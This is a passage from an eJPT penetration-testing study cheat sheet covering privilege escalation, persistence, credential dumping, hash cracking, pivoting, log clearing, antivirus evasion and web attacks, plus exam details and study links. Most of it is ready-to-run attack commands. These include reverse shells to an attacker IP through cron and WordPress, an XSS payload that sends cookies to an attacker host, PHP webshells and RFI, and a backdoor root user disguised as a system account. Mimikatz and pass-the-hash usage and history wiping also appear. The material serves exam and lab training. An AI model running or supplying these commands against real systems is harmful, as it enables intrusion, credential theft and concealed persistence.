gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
# 2. Run allowed sudo command with the library:
sudo LD_PRELOAD=/tmp/shell.so <allowed_command>
```

#### SUID Binary Path Hijacking
```bash
# Find SUID binaries owned by root:
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Investigate what a SUID binary calls:
strings /path/to/suid_binary       # Look for calls to other binaries (e.g. "greetings")

# If it calls a relative path (e.g. "./greetings"), hijack it:
cp /bin/bash ./greetings           # Place bash where the binary looks
./suid_binary                      # Spawns root shell
```

#### Cron Job — Inject Sudoers Entry
```bash
# If a writable script runs as root via cron:
printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /path/to/cron_script.sh
# After cron runs: sudo su
```

#### Chkrootkit PrivEsc (CVE — v0.49)
```bash
# Check if chkrootkit runs as root in cron:
ps aux | grep chkrootkit
# Exploit with Metasploit:
use exploit/unix/local/chkrootkit
set CHKROOTKIT /bin/chkrootkit
set SESSION <id>
run
```
```bash
searchsploit -m 40839.c
gcc -pthread 40839.c -o dirty -lcrypt
./dirty <new_password>
```

---

## 8. Persistence

### Windows — Service Persistence
```
use exploit/windows/local/persistence_service
set SESSION <id>
set LPORT <port>
set SERVICE_NAME <name>
run

# After session closes, reconnect:
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <ip>
set LPORT <port>
run
```

### Windows — RDP Backdoor (getgui)
```
run getgui -e -u <user> -p <password_01>
xfreerdp /u:<user> /p:<password_01> /v:<target_ip>
```

### Linux — SSH Key Persistence
```bash
# On target — grab the private key:
cat ~/.ssh/id_rsa

# On attacker:
scp <user>@<target>:~/.ssh/id_rsa .
chmod 400 id_rsa
ssh -i id_rsa <user>@<target>

# Or add your public key to authorized_keys on target:
echo "<your_pub_key>" >> ~/.ssh/authorized_keys
```

### Linux — Cron Job Persistence
```bash
# Create reverse shell cron entry (on target):
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<attacker_ip>/1234 0>&1'" > /tmp/cron
crontab /tmp/cron    # Install from file (NOT crontab -i, that's for prompting before delete)
crontab -l           # Verify

# On attacker:
nc -nvlp 1234
```

### Linux — Backdoor User (Persistence)
```bash
# Add a hidden backdoor user with root privileges
# Use a name that blends in (e.g. "ftp", "daemon", "systemd"):
useradd -m ftp -s /bin/bash
passwd ftp
usermod -aG root ftp
usermod -u 15 ftp                              # Set low UID to look like a system user
usermod -g 15 ftp

# Only works if SSH or another remote access service is available
```

### Meterpreter — Keylogger
```bash
# In meterpreter session:
keyscan_start                                  # Start capturing keystrokes
keyscan_dump                                   # Dump captured keystrokes
keyscan_stop
```

### Metasploit — Workspace Management
```bash
workspace                                      # List all workspaces
workspace -a <name>                            # Create new workspace
workspace <name>                               # Switch to workspace
workspace -h                                   # Help

# Global variable shortcuts:
setg RHOSTS <target_ip>
setg LHOST <attacker_ip>
setg LPORT 4444

# Useful search patterns:
search type:auxiliary name:http
search type:exploit platform:linux
search type:post platform:windows gather
```

### Hash Type Identification Guide
```
Linux /etc/shadow hash prefixes:
  $1$  = MD5
  $2$  = Blowfish
  $5$  = SHA-256
  $6$  = SHA-512  ← most common on modern Linux

Windows:
  NTLM hashes (no prefix) — format: aad3b435b51404eeaad3b435b51404ee:<ntlm>
```

### Windows — Dump SAM Hashes (Meterpreter)
```bash
# Migrate to SYSTEM/lsass process first:
pgrep lsass
migrate <lsass_pid>
hashdump
# Copy output to hashes.txt
```

### Windows — Kiwi (in-memory dump, Meterpreter)
```bash
# Requires SYSTEM privileges:
load kiwi
lsa_dump_sam                            # SAM hashes
lsa_dump_secrets                        # LSA secrets
creds_all                               # All credentials at once
```

### Windows — Mimikatz (on target)
```
mimikatz> privilege::debug
mimikatz> sekurlsa::logonpasswords      # Plaintext passwords from memory
mimikatz> lsadump::sam                  # SAM hashes
```

### Linux — Dump Hashes
```bash
cat /etc/shadow                         # Requires root/sudo
# Combine with passwd for John:
unshadow /etc/passwd /etc/shadow > unshadowed.txt

# Metasploit post modules:
use post/linux/gather/hashdump
use post/multi/gather/ssh_creds         # Dump SSH keys/creds
use post/linux/gather/ecryptfs_creds
use post/linux/gather/enum_psk          # VPN pre-shared keys
use post/linux/gather/pptpd_chap_secrets
set SESSION 1
run
```

### John the Ripper — NT (Windows)
```bash
john --list=formats
john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
john --format=NT hashes.txt                    # Uses default wordlist
john --show --format=NT hashes.txt
john -wordlist=<wordlist> -rules <file>        # Mangling rules (cat → c@t, CAT...)
john -incremental -users:<user_list> <file>    # Target specific users only
john --show <file>                             # Show cracked passwords
```

### John the Ripper — Linux (sha512crypt)
```bash
john --format=sha512crypt unshadowed.txt --wordlist=/usr/share/wordlists/rockyou.txt
john --format=sha512crypt /etc/shadow --wordlist=/usr/share/wordlists/rockyou.txt
```

### Hashcat — Windows NTLM (mode 1000)
```bash
hashcat -a 3 -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
# -a 3 = brute-force/wordlist attack mode
# -m 1000 = NTLM
```

### Hashcat — Linux SHA-512 (mode 1800)
```bash
hashcat --help | grep 1800
hashcat -a 3 -m 1800 unshadowed.txt /usr/share/wordlists/rockyou.txt
# Other Linux modes:
# -m 500  = MD5 ($1$)
# -m 3200 = Blowfish ($2$)
# -m 7400 = SHA-256 ($5$)
# -m 1800 = SHA-512 ($6$)
```

### Login with Cracked Credentials
```bash
xfreerdp /u:<user> /p:<password> /v:<target_ip>   # RDP
ssh <user>@<target_ip>                             # SSH

# PSExec (Metasploit):
use exploit/windows/smb/psexec
set SMBUser <user>
set SMBPass <password>
exploit
```

### Pass-the-Hash (no cracking needed)
```bash
# Metasploit psexec with hash:
use exploit/windows/smb/psexec
set SMBUser Administrator
set SMBPass aad3b435b51404eeaad3b435b51404ee:<ntlm_hash>
exploit

# CrackMapExec with hash (-H flag):
crackmapexec smb <ip> -u Administrator -H <ntlm_hash>
crackmapexec winrm <ip> -u Administrator -H <ntlm_hash>

# Metasploit smb_login:
set SMBPass aad3b435b51404eeaad3b435b51404ee:<ntlm_hash>
```

---

## 10. Pivoting

### Metasploit Autoroute
```bash
# In meterpreter session:
run autoroute -s <subnet/mask>    # e.g. 10.0.29.0/20
run autoroute -p                  # Print routes
```

### Port Forwarding (via Meterpreter)
```bash
portfwd add -l 1234 -p 80 -r <target2_ip>    # Forward target2:80 → localhost:1234
portfwd list                                   # List active forwards
# Then scan via local port:
nmap -sV -sS -p 1234 localhost

# Also use MSF tcp portscan module through route (before portfwd):
use auxiliary/scanner/portscan/tcp
set RHOSTS <target2_ip>
set PORTS 1-10000
run
```

### SOCKS Proxy Pivoting (proxychains)
```bash
# Alternative to portfwd — routes ALL traffic through pivot, not just one port:

# Step 1 — background meterpreter and add route manually:
background
route add <target2_subnet>/24 <session_id>
# e.g: route add 192.108.156.0/24 1

# Step 2 — set up SOCKS proxy:
use auxiliary/server/socks_proxy
set VERSION 4a
set SRVPORT 9050
run -j

# Step 3 — use proxychains to route any tool through the pivot:
proxychains nmap -sT -Pn 192.108.156.3        # -sT required (no raw sockets via proxy)
proxychains curl http://192.108.156.3
proxychains ssh user@192.108.156.3
# Note: /etc/proxychains.conf must have: socks4 127.0.0.1 9050
```
```
# You CANNOT use a reverse TCP payload through autoroute (Victim2 can't reach you directly)
# Use bind_tcp instead — YOU connect TO the target, not the other way around:
set payload windows/meterpreter/bind_tcp
```

### Visualizing Pivoting
```
Attacker ──────► Victim 1 ──────► Victim 2
192.168.1.2     192.168.1.3       10.10.10.3
                10.10.10.2
```
- Attacker can only reach Victim 1 directly
- Autoroute adds the 10.10.10.0/24 route through Victim 1's session
- **Important:** autoroute alone does NOT make Victim 2 able to reach back to you — use `portfwd` for that, or use `bind_tcp` payload

---

## 11. Clearing Tracks

### Windows
```
clearev    # Metasploit: clears Windows event logs
# Some exploits have resource scripts that auto-clean:
resource /path/to/script.rc
```

### Linux
```bash
# Clear bash history:
cat /dev/null > ~/.bash_history
history -c
echo "" > ~/.bash_history

# Always work from:
/tmp/        # Linux
C:\Temp\     # Windows
```

---

## 12. AV Evasion

### Shellter (Windows PE Backdooring)
```bash
sudo dpkg --add-architecture i386
sudo apt-get install wine32
sudo wine shellter.exe
# Note: Shellter only works with wine 32 and 32-bit payloads
```

### PowerShell Obfuscation (Invoke-Obfuscation)
```powershell
# On Kali:
./Invoke-Obfuscation/
Import-Module ./Invoke-Obfuscation.psd1
Invoke-Obfuscation
SET SCRIPTPATH /home/kali/Desktop/shell.ps1
AST → ALL → 1
# Copy generated output → save as .ps1 → upload & execute
```

### PowerShell Reverse Shell (manual)
```bash
# Get payload from revshells.com or msfvenom
# Paste into text editor, remove:  powershell -nop -c "  and trailing  "
# Set correct IP and port, save as shell.ps1
nc -nvlp <port>
# Upload and execute on target
```

---

## 13. Quick Reference — Common CVEs & Exploits

| CVE / Name | Service | Type | Metasploit Module / Tool |
|---|---|---|---|
| CVE-2014-6287 | Rejetto HFS 2.3.x | RCE | EDB-39161.py |
| CVE-2018-10933 | libssh 0.6–0.8.3 | Auth Bypass | `scanner/ssh/libssh_auth_bypass` |
| CVE-2017-0143 | SMBv1 (EternalBlue) | RCE | `windows/smb/ms17_010_eternalblue` |
| CVE-2019-0708 | RDP (BlueKeep) | RCE pre-auth | `windows/rdp/cve_2019_0708_bluekeep_rce` |
| CVE-2016-5195 | Linux Kernel (DirtyCOW) | PrivEsc | EDB-40839.c |
| CVE-2014-0160 | OpenSSL (Heartbleed) | Info Leak | `scanner/ssl/openssl_heartbleed` |
| CVE-2021-44228 | Log4Shell | RCE | nmap `log4shell.nse` |
| CVE-2020-11738 | WP Duplicator plugin | File Read | `scanner/http/wp_duplicator_file_read` |
| CVE-2015-3306 | ProFTPD 1.3.5 mod_copy | RCE | `unix/ftp/proftpd_modcopy_exec` |
| CVE-2011-2523 | vsftpd 2.3.4 | Backdoor RCE | `unix/ftp/vsftpd_234_backdoor` |
| CVE-2017-7494 | Samba 3.5.0+ | RCE | `linux/samba/is_known_pipename` |
| CVE-2017-16137 | Haraka SMTP < 2.8.9 | Command Injection | searchsploit haraka |
| Java RMI | Java RMI Registry | RCE | `multi/misc/java_rmi_server` |
| FlatCore CMS 2.0.7 | PHP CMS | RCE (Auth) | EDB-50262 |
| UnrealIRCd 3.x | IRC | Backdoor | `unix/irc/unreal_ircd_3281_backdoor` |
| Apache Tomcat < 9 | Java Web Server (8080) | RCE | `multi/http/tomcat_jsp_upload_bypass` |

---

## Key File Paths Cheat Sheet

| Purpose | Linux | Windows |
|---|---|---|
| User accounts | `/etc/passwd` | `C:\Windows\System32\config\SAM` |
| Password hashes | `/etc/shadow` | (use hashdump via Meterpreter) |
| Cron jobs | `/etc/cron*`, `crontab -l` | `schtasks /query` |
| Hosts file | `/etc/hosts` | `C:\Windows\System32\drivers\etc\hosts` |
| Work directory | `/tmp` | `C:\Temp` |
| SSH keys | `~/.ssh/id_rsa` | — |
| Netcat (Windows) | `/usr/share/windows-resources/binaries/nc.exe` | — |
| Webshells (PHP) | `/usr/share/webshells/php/` | — |
| Wordlists | `/usr/share/wordlists/` | — |
| Metasploit wordlists | `/usr/share/metasploit-framework/data/wordlists/` | — |

---

## Common Ports Quick Reference

| Port | Service | Notes |
|---|---|---|
| 21 | FTP | Try anonymous login; look for upload paths |
| 22 | SSH | Brute force with Hydra / ssh_login |
| 23 | Telnet | Clear-text; low-hanging fruit |
| 80/8080 | HTTP | Check for CMS, vulns, file upload |
| 139/445 | SMB | EternalBlue, psexec, shares |
| 1099 | Java RMI | java_rmi_server exploit |
| 3306 | MySQL | mysql_login, credential dumping |
| 3389 | RDP | xfreerdp after getting creds |
| 4848 | GlassFish | Admin panel, default creds |
| 9200 | Elasticsearch | Often unauthenticated |

---

*Good luck on the eJPT! Remember: enumerate thoroughly before exploiting, always check services and versions, and document flags as you go.*

---

## 14. Web Application Pentesting

### Web App Security Testing vs Pentesting

| Aspect | Security Testing | Pentesting |
|---|---|---|
| Objective | Identify vulns without exploiting | Actively exploit to assess impact |
| Focus | Broad — manual + automated | Specific — mainly manual |
| Methodology | SAST, DAST, IAST, SCA, etc. | Simulate real-world attacks |
| Exploitation | No | Yes (controlled) |
| Goal | Enhance security posture | Validate security controls |

**Testing types:** Vulnerability scanning, pentesting, code review, static analysis

---

### HTTP Reconnaissance with curl

```bash
curl -I -v http://<target>/              # Grab headers
curl -v -X OPTIONS http://<target>/      # Check allowed HTTP methods
curl http://<target>/uploads/ --upload-file /usr/share/webshells/php/simple-shell.php
# Then trigger it: curl "http://<target>/uploads/simple-shell.php?cmd=whoami"
```

### Web Fingerprinting
```bash
whatweb <target>                          # Identify technologies
whatweb -a 1 <target>                     # Stealth mode
nikto -h <target>                         # Vulnerability scan
whois <target>
dnsrecon -d <target>

# Banner grabbing via netcat:
nc <ip> 80
HEAD / HTTP/1.0

# HTTPS:
openssl s_client -connect <ip>:443
HEAD / HTTP/1.0

# httprint:
httprint -P0 -h <ip> -s /usr/local/bin/signatures.txt
```

### Cache-Control Directives (Theory)
| Directive | Meaning |
|---|---|
| `public` | Can be cached by any intermediary (proxies, etc.) |
| `private` | Only cached for the specific user |
| `no-cache` | Must revalidate with server before using cached version |
| `no-store` | Must NOT be stored in any cache |
| `max-age=<s>` | Max seconds the response can be cached |

---

### Directory & File Brute-Force

#### dirb
```bash
dirb http://<target>/
dirb http://<target>/ /usr/share/dirb/wordlists/small.txt
dirb http://<target>/ -X ".php,.bak"           # Filter by extension
dirb http://<target>/ -c "COOKIE:XYZ"          # With cookie
dirb http://<target>/ -u "admin:password"       # Basic auth
dirb http://<target>/ -H "MyHeader: MyContent"  # Custom header
dirb http://<target>/ -r                        # No recursion
dirb http://<target>/ -z 1000                   # Slow scan (ms delay)
dirb http://<target>/ -o results.txt            # Save output
# Always check /data directory in results
```

#### gobuster
```bash
gobuster dir -u http://<target>/ -w /usr/share/wordlists/dirb/common.txt -b 403,404
gobuster dir -u http://<target>/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -b 403,404,301 \
  -x .php,.xml,.txt \
  -r                                            # -r = follow redirects
```

#### Other tools
```bash
ffuf -w /path/to/wordlist.txt:FUZZ -u http://<target>/FUZZ
dirsearch -u http://<target>/ -e *
```

---

### Web Vulnerability Scanning — Nikto

```bash
nikto -Help
nikto -h <target>
nikto -h <target> -Tuning 5 -o nikto.html -Format htm
# Tuning 5 = Remote File Include tests
```

---

### CMS Security Testing Methodology

1. **Information Gathering & Enumeration**
   - Identify CMS and its version
   - Enumerate users, plugins, themes
   - Directory and file enumeration

2. **Vulnerability Scanning**
   - Test for common misconfigurations
   - Scan plugins/themes for known CVEs

3. **Authentication Testing**
   - Username enumeration + brute force on login pages
   - Test session handling for fixation vulnerabilities

4. **Exploitation**
   - Exploit known CVEs in CMS core, plugins, themes (XSS, SQLi, RCE)

5. **Post-Exploitation**
   - Plant web shell or backdoor for persistence
   - Extract sensitive data from CMS or underlying server

---

### WordPress Pentesting

#### WPScan — Enumeration
```bash
wpscan -h
wpscan --url http://<target>
wpscan --url http://<target> -e u                          # Enumerate users (correct flag is -e u, NOT -eu)
wpscan --url http://<target> -U admin \
  -P /root/Desktop/wordlists/100_common.txt              # Brute force password
```

#### Key WordPress Paths
```
/wp-admin.php          Admin panel login
/wp-login.php          Alternate login
/wp-config.php         DB credentials (if exposed/readable)
/wp-content/plugins/   Plugin directory (check for vuln plugins)
/wp-content/uploads/   Upload directory (may allow webshell upload)
```

#### Reverse Shell via WordPress (URL-encoded)
```bash
# Payload:
/bin/bash -c "bash -i>& /dev/tcp/<attacker_ip>/<port> 0>&1"

# URL-encoded version (use in Burp or curl):
%2f%62%69%6e%2f%62%61%73%68%20%2d%63%20%22%62%61%73%68%20%2d%69%3e%26%20%2f%64%65%76%2f%74%63%70%2f<ip>%2f<port>%20%30%3e%26%31%22

# Listener on attacker:
nc -nvlp <port>
```

---

### Hydra — HTTP Form Brute Force

```bash
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
  -P /root/Desktop/wordlists/100-common-passwords.txt \
  <target> http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid username or password"
# F= defines the failure string to detect wrong credentials
```

---

### HTTP Methods / Verbs
```
GET    POST    HEAD    PUT    DELETE    OPTIONS
```
```bash
# Check allowed methods:
curl -v -X OPTIONS http://<target>/
nc <ip> 80
OPTIONS / HTTP/1.0

# Upload shell via PUT (if allowed):
wc -m shell.php                # Get exact file size
# Then send:
# PUT /shell.php HTTP/1.0
# Content-type: text/html
# Content-length: <size from wc>
# <paste file content>
```

### Google Dorks
```
site:<domain>              # Results from specific domain only
intitle:<text>             # Filter by page title
inurl:<text>               # Filter by URL content
filetype:<ext>             # Filter by file extension
-<keyword>                 # Exclude keyword

# Find exposed directory listings:
-inurl:(htm|html|php|asp|jsp) intitle:"index of" "last modified" "parent directory" txt OR doc OR pdf
```
Full list: https://www.exploit-db.com/google-hacking-database

### XSS (Cross-Site Scripting)
```html
<!-- Simple test: -->
<script>alert(1)</script>

<!-- Case variation filter bypass: -->
<ScRiPt>alert(1)</ScRiPt>

<!-- Cookie theft payload: -->
<script>var i=new Image();i.src="http://<attacker>/log.php?q="+document.cookie;</script>
```
XSS filter bypass cheatsheet: https://owasp.org/www-community/xss-filter-evasion-cheatsheet

### SQL Injection
```sql
-- Login bypass:
' OR 'a'='a
admin'--

-- UNION-based data extraction:
' UNION SELECT Username, Password FROM Accounts WHERE 'a'='a
' UNION SELECT user(); -- -

-- Blind boolean:
' OR substr(user(),1,1) = 'a
```

### SQLMap (automated SQLi)
```bash
# GET parameter:
sqlmap -u 'http://<target>/view.php?id=1' --banner
sqlmap -u 'http://<target>/view.php?id=1' -p id           # Target specific param
sqlmap -u 'http://<target>/view.php?id=1' --users
sqlmap -u 'http://<target>/view.php?id=1' --dbs
sqlmap -u 'http://<target>/view.php?id=1' --tables
sqlmap -u 'http://<target>/view.php?id=1' -D <db> -T <table> --dump
sqlmap -u 'http://<target>/view.php?id=1' -p id --technique=U    # UNION only
sqlmap -u 'http://<target>/view.php?id=1' --cookie "PHPSESSID=abc123"
sqlmap -u 'http://<target>/view.php?id=1' -v3 --fresh-queries

# POST form:
sqlmap -u 'http://<target>/login.php' --data="user=admin&password=admin"
sqlmap -u 'http://<target>/login.php' --data="user=admin&password=admin" --dbs
sqlmap -u 'http://<target>/login.php' --data="user=admin&password=admin" -D <db> -T <table> --dump

# From saved Burp request file:
sqlmap -r login.req --dbs
sqlmap -r login.req -D <db> -T <table> --dump
```

### SQL Injection — Login Bypass (manual)

```
Username: admin'--
Password: (anything)
```
The `'--` comments out the rest of the SQL query, bypassing the password check entirely.

---

### Web Recon — Key Files to Check Manually
```
robots.txt        → hidden directories not indexed by search engines
sitemap.xml       → full site structure
/.git/            → exposed git repo (may contain source code/credentials)
/phpinfo.php      → PHP configuration info (often reveals server paths)
/admin/           → admin panels
/backup/          → backup files
/.env             → environment file (often has DB passwords, API keys)
/wp-config.php    → WordPress database credentials
```

### Hydra — HTTP Basic & Digest Auth Brute Force
```bash
# HTTP Basic/Digest Authentication:
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt <ip> http-head /admin/
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt <ip> http-get /admin/

# HTTPS POST form:
hydra -l admin -P /usr/share/wordlists/rockyou.txt example.com \
  https-post-form "/login.php:username=^USER^&password=^PASS^&login=Login:Not allowed"

# WebDAV basic auth:
hydra -L users.txt -P passwords.txt <ip> http-get /webdav/
```

### Path Traversal / LFI (Local File Inclusion)
```bash
# Try reading files above web root:
http://<target>/../../flag.txt
http://<target>/page?file=../../../../etc/passwd
http://<target>/page?file=../../../../etc/shadow
http://<target>/page?file=../../../../windows/system32/drivers/etc/hosts

# PHP filter wrapper (read source code as base64):
http://<target>/page?file=php://filter/convert.base64-encode/resource=index.php
# Then: echo '<base64output>' | base64 -d

# Log poisoning (LFI → RCE):
# 1. Poison apache log: nc <ip> 80 → send: GET /<?php system($_GET['cmd']); ?> HTTP/1.1
# 2. Include log file: ?file=../../../../var/log/apache2/access.log&cmd=id
```

### RFI (Remote File Inclusion)
```bash
# Only works if allow_url_include = On in php.ini
http://<target>/page?file=http://<attacker_ip>/shell.php

# Host the shell on attacker:
echo '<?php system($_GET["cmd"]); ?>' > shell.php
python3 -m http.server 80
```

### File Upload Bypass
```bash
# Change MIME type in Burp (bypass client-side checks):
Content-Type: image/jpeg        # Upload shell.php but change header to image type

# Double extension / null byte:
shell.php.jpg
shell.php%00.jpg                # Null byte truncation (old PHP < 5.3)

# Case variation:
shell.pHp    shell.PHP

# Alternative PHP extensions (if .php blocked):
.php3  .php4  .php5  .phtml  .phar

# .htaccess trick — upload .htaccess first:
# Content: AddType application/x-httpd-php .jpg
# Then upload shell.jpg → executes as PHP
```

---

### Post-Exploitation — Finding Flags on Web Server

```bash
find / -iname "*flag*" 2>/dev/null
# -iname = case-insensitive
# *flag* = wildcard match
# 2>/dev/null = suppress permission errors
```

---

## 15. eJPT Exam Info

### Exam Structure (from dev-angelist/eJPTv2-Notes)
- **Duration:** 48 hours (lab on)
- **Questions:** 35 (multiple choice + flag submission)
- **Format:** Black-box pentest simulation, in-browser lab (no VPN needed)
- **Open book:** Yes. Dynamic flags randomly injected per session.
- **Pass requirement:** At least **70% overall** + minimum per domain:

| Domain | Weight | Min Score |
|---|---|---|
| Assessment Methodologies | 25% | 90% |
| Host & Network Auditing | 25% | 80% |
| Host & Network Pen Testing | 35% | 70% |
| Web Application Pen Testing | 15% | 60% |

### Exam Objectives by Domain

**Assessment Methodologies:**
- Locate endpoints on a network
- Identify vulnerabilities in services
- Identify OS of a target
- Identify open ports and services
- Extract company info from public sources (OSINT)
- Gather technical / email info from public sources
- Evaluate criticality/impact of vulnerabilities

**Host & Network Auditing:**
- Transfer files to/from target
- Enumerate system information
- Gather user account and hash/password info
- Enumerate network information from files on target

**Host & Network Pen Testing:**
- Conduct hash cracking
- Identify and modify exploits
- Brute-force password attacks
- Exploitation with Metasploit
- Pivoting via autoroute and port forwarding

**Web Application Pen Testing:**
- Webapp reconnaissance
- Brute-force login attacks
- Locate hidden files and directories
- Identify web vulnerabilities


## 16. Study Resources & Practice Labs

### Community eJPT Notes (GitHub)
| Repo | Stars | Notes |
|---|---|---|
| [dev-angelist/eJPTv2-Notes](https://github.com/dev-angelist/eJPTv2-Notes) | 330+ | Most complete, includes cheat sheet |
| [edoardottt/eJPT-notes](https://github.com/edoardottt/eJPT-notes) | 156+ | Passed 19/20, very clean cheatsheet |
| [PakCyberbot/eJPTv2-Notes](https://github.com/PakCyberbot/eJPTv2-Notes) | — | Comprehensive v2 notes |
| [neilmadhava/EJPTv2-Notes](https://github.com/neilmadhava/EJPTv2-Notes) | — | eJPTv2 study notes |
| [4nt11/eJPT-Notes](https://github.com/4nt11/eJPT-Notes) | — | Personal course notes |
| [xalgord/ejPTv2-Preparation](https://github.com/xalgord/ejPTv2-Preparation) | — | Preparation guide |
| [Dragkob/eJPT](https://github.com/Dragkob/eJPT) | — | Notes & cheatsheet |
| [shellkraft/eJPT-Notes](https://github.com/shellkraft/eJPT-Notes/tree/main) | — | eJPT notes |

### Cheatsheets & Reviews
| Link | What it covers |
|---|---|
| [sezioss-gitbook eJPTv2 Cheatsheet](https://sezioss-gitbook.gitbook.io/ejptv2cheatsheet/) | Full cheatsheet per domain |
| [nmmorette eJPTv2 Cheatsheet](https://nmmorette.github.io/posts/2023/12/ejptv2-cheat-sheet/) | Clean cheatsheet by exam passer |
| [nmmorette Exam Review](https://nmmorette.github.io/posts/2023/12/review-ejptv2-junior-penetration-tester/) | Tips, labs, domain breakdown |
| [Mastering eJPTv2 — InfoSec Writeups](https://infosecwriteups.com/mastering-the-ejptv2-exam-ec38daec16bc) | Detailed walkthrough |
| [How to pass first time — Medium](https://medium.com/@polygonben/ejpt-a-guide-on-how-to-pass-first-time-f8cec3f79a73) | Pass guide |
| [killswitchx7 Exam Review](https://blog.killswitchx7.com/my-ejptv2-0-exam-review) | Exam experience |

### Recommended Practice Machines (TryHackMe)
- Basic Pentesting, Ice, Brooklyn Nine Nine, Anonymous
- Easy Peasy, GoldenEye, HA Joker CTF, Source
- Poster, WordPress CVE-2021-29447, Blog, RootMe

### Hack The Box — Practice
- Machine IDs: 1, 2, 3, 114, 146, 344

### PrivEsc Tools
| Tool | Link | Use |
|---|---|---|
| PrivescCheck | [itm4n/PrivescCheck](https://github.com/itm4n/PrivescCheck) | Windows PowerShell PrivEsc checker |
| JAWS | [411Hall/JAWS](https://github.com/411Hall/JAWS) | Windows automated local enum |
| LinEnum | [rebootuser/LinEnum](https://github.com/rebootuser/LinEnum) | Linux automated local enum |

---

*Good luck on the eJPT! Remember: enumerate thoroughly before exploiting, always check services and versions, and document flags as you go.*
